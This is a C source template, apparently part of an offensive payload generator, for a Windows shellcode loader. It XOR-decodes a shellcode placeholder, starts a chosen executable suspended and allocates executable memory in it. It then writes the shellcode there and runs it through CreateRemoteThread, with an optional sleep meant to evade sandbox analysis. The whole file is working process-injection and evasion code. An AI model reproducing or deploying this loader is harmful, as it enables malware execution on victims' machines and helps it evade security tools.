#include <stdio.h>
#include <string.h>
#include <processthreadsapi.h>
#include <windows.h>
#include <conio.h>

//#include "syscalls_common.h"

    const char shellcode[] = "{{ shellcode }}";
    const char key[] = "{{ key }}";
    char decoded_shellcode[{{ shellcode_length }}];

    char* decode() {
	for(int i = 0; i < {{ shellcode_length }}; i++) {
	    decoded_shellcode[i] = shellcode[i] ^ key[i % {{ key_length }}];
	}

	return decoded_shellcode;
    }

    void spawn_inject_remote_process() {
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};

	si.cb = sizeof(si);
	BOOL creationResult = CreateProcess("{{ options.remote_inject_executable.replace('\\', '\\\\') }}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	if(creationResult) {
	    PVOID remoteBuff = VirtualAllocEx(pi.hProcess, NULL, {{shellcode_length}}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	    WriteProcessMemory(pi.hProcess, remoteBuff, decoded_shellcode, {{shellcode_length}}, NULL);
	    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuff, NULL, 0, NULL);

	    // Keep the program open.
	    getch();
	}
	else {
	    exit(-1);
	}

	CloseHandle(pi.hProcess);
    }

    int main() {
	{% if options.sleep_evasion and options.sleep_evasion > 0 %}
	Sleep({{ options.sleep_evasion * 1000 }});
	{% endif %}

	char* decoded_shellcode = decode();
	spawn_inject_remote_process();
	return 0;
    }
